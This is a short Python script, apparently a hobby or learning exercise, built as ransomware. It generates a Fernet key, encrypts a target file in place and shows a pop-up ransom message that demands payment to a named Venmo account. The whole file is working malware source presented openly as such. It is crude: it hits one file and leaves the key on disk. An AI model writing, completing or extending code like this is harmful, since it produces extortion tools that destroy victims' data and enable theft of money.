# Resources used: 
# https://www.geeksforgeeks.org/encrypt-and-decrypt-files-using-python/
# https://www.geeksforgeeks.org/python-tkinter-messagebox-widget/
import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet

# Spawn a little pop-up window with the ransom message
root = tk.Tk()
root.withdraw()

# Set the path of where this script is being executed from
script_directory = os.path.dirname(os.path.abspath(__file__))
# Target file(s) go here, it will grab the absolute path of that as well
filename = "file.txt"
file_path = os.path.join(script_directory, filename)
#new_file_path = os.path.join(script_directory, new_filename)
key = Fernet.generate_key()
# Makes a new file called filekey.key and throws the generated key in there
with open('filekey.key', 'wb') as filekey:
    filekey.write(key)
# Grabs the key from that file we just made
with open('filekey.key', 'rb') as filekey:
    key = filekey.read()

fernet = Fernet(key)
# Opens our file that we want to encrypt
with open(file_path, 'rb') as file:
    original = file.read()
# This line is what actually encrypts the file 
encrypted = fernet.encrypt(original)
# Writes the encrypted stuff to the file and displays the ransom
with open(file_path, 'wb') as encrypted_file:
    encrypted_file.write(encrypted)
    messagebox.showinfo("ALERT", "MMmmmm I gobbled your files up and scrambled them with my scrambleinator! My venmo is miles-cummings")